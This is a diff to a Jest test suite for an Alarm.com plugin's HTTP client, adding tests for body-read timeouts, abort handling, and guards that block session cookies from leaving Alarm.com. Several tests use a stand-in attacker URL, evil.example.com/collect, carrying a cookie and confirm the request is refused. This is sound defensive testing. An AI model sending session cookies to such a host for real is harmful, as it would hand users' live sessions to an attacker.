@@ -11,7 +11,12 @@
 
 import nock from 'nock'
 import { httpRequest, USER_AGENT } from '../../../src/api/http'
-import { AlarmComError, NetworkError, TimeoutError } from '../../../src/errors'
+import {
+  AlarmComError,
+  NetworkError,
+  OperationAbortedError,
+  TimeoutError,
+} from '../../../src/errors'
 import { BASE_URL } from '../../../src/settings'
 import { captureRejection } from '../../helpers/errors'
 
@@ -22,7 +27,8 @@ describe('httpRequest', () => {
     const response = await httpRequest(`${BASE_URL}/web/KeepAlive.aspx`)
 
     expect(response.status).toBe(200)
-    await expect(response.text()).resolves.toBe('{"status":200}')
+    expect(response.ok).toBe(true)
+    expect(response.text).toBe('{"status":200}')
   })
 
   it('identifies the plugin honestly rather than impersonating a browser', async () => {
@@ -76,18 +82,104 @@ describe('httpRequest', () => {
     expect(Date.now() - startedAt).toBeLessThan(400)
   })
 
-  it('classifies an aborted request as a timeout', async () => {
-    // The abort has to be simulated. Node's real fetch rejects with a
-    // DOMException, and inside Jest's VM context a DOMException fails
-    // `instanceof Error` because it inherits from the host realm's Error, so a
-    // genuinely aborted request cannot reach the timeout branch under test.
-    const aborted = Object.assign(new Error('This operation was aborted'), { name: 'AbortError' })
-    jest.spyOn(globalThis, 'fetch').mockRejectedValue(aborted)
+  it('classifies a request that outran its deadline as a timeout', async () => {
+    nock(BASE_URL).get('/web/KeepAlive.aspx').delay(200).reply(200, '')
 
     const error = await captureRejection(httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { timeoutMs: 20 }))
 
     expect(error).toBeInstanceOf(TimeoutError)
     expect(error.message).toBe('Request to https://www.alarm.com/web/KeepAlive.aspx timed out after 20ms')
+  })
+
+  /**
+   * `fetch` settles as soon as headers arrive. A deadline that stops there
+   * leaves a stalled body read with no bound at all, and every caller reads the
+   * body — so one hung response used to stop polling for the life of the
+   * process with nothing in the log.
+   */
+  it('holds the deadline over the body, not just the headers', async () => {
+    nock(BASE_URL)
+      .get('/web/KeepAlive.aspx')
+      .delayBody(500)
+      .reply(200, 'a slow body')
+
+    const error = await captureRejection(
+      httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { timeoutMs: 40 }),
+    )
+
+    expect(error).toBeInstanceOf(TimeoutError)
+  })
+
+  describe('cancellation', () => {
+    it('refuses a request whose signal has already aborted', async () => {
+      const error = await captureRejection(
+        httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { signal: AbortSignal.abort() }),
+      )
+
+      expect(error).toBeInstanceOf(OperationAbortedError)
+    })
+
+    it('abandons an in-flight request when the caller aborts', async () => {
+      nock(BASE_URL).get('/web/KeepAlive.aspx').delay(500).reply(200, '')
+      const controller = new AbortController()
+      setTimeout(() => controller.abort(), 20)
+
+      const error = await captureRejection(
+        httpRequest(`${BASE_URL}/web/KeepAlive.aspx`, { signal: controller.signal }),
+      )
+
+      expect(error).toBeInstanceOf(OperationAbortedError)
+      expect(error.message).not.toContain('timed out')
+    })
+  })
+
+  /**
+   * Today no URL is server-supplied and redirects are not followed, so this
+   * cannot fire. That is the point: the safety is an emergent property of two
+   * unrelated decisions, and a change to either should fail loudly rather than
+   * quietly replay a live session cookie to another host.
+   */
+  it('refuses to send session cookies anywhere but Alarm.com', async () => {
+    const error = await captureRejection(
+      httpRequest('https://evil.example.com/collect', { headers: { Cookie: 'afg=secret' } }),
+    )
+
+    expect(error).toBeInstanceOf(NetworkError)
+    expect(error.message).toContain('Refusing to send session cookies')
+    expect(error.message).not.toContain('secret')
+  })
+
+  /**
+   * `fetch` normalises header names, so a caller spelling it `cookie` sends the
+   * same jar. A case-sensitive property read made the guard silently do nothing
+   * for that spelling — worse than no guard, because it reads as covering both.
+   */
+  it('applies the origin check whatever case the header name is written in', async () => {
+    for (const name of ['cookie', 'COOKIE', 'CoOkIe']) {
+      const error = await captureRejection(
+        httpRequest('https://evil.example.com/collect', { headers: { [name]: 'afg=secret' } }),
+      )
+
+      expect(error.message).toContain('Refusing to send session cookies')
+    }
+  })
+
+  /**
+   * A followed redirect replays the request, cookies included, at a location the
+   * server chose — and `fetch` offers no hook to re-check each hop. The only
+   * honest control is to refuse the combination.
+   */
+  it('refuses to follow redirects on a request that carries session cookies', async () => {
+    const error = await captureRejection(
+      httpRequest(`${BASE_URL}/web/api/identities`, {
+        headers: { Cookie: 'afg=secret' },
+        redirect: 'follow',
+      }),
+    )
+
+    expect(error).toBeInstanceOf(NetworkError)
+    expect(error.message).toContain('Refusing to follow redirects')
+    expect(error.message).not.toContain('secret')
   })
 
   it('raises a NetworkError when the request fails below the HTTP layer', async () => {
@@ -117,8 +209,7 @@ describe('httpRequest', () => {
   })
 
   it('keeps the query string out of timeout messages too', async () => {
-    const aborted = Object.assign(new Error('This operation was aborted'), { name: 'AbortError' })
-    jest.spyOn(globalThis, 'fetch').mockRejectedValue(aborted)
+    nock(BASE_URL).get('/web/api/websockets/token').query(true).delay(200).reply(200, '')
 
     const url = `${BASE_URL}/web/api/websockets/token?auth=super-secret-token`
     const error = await captureRejection(httpRequest(url, { timeoutMs: 20 }))
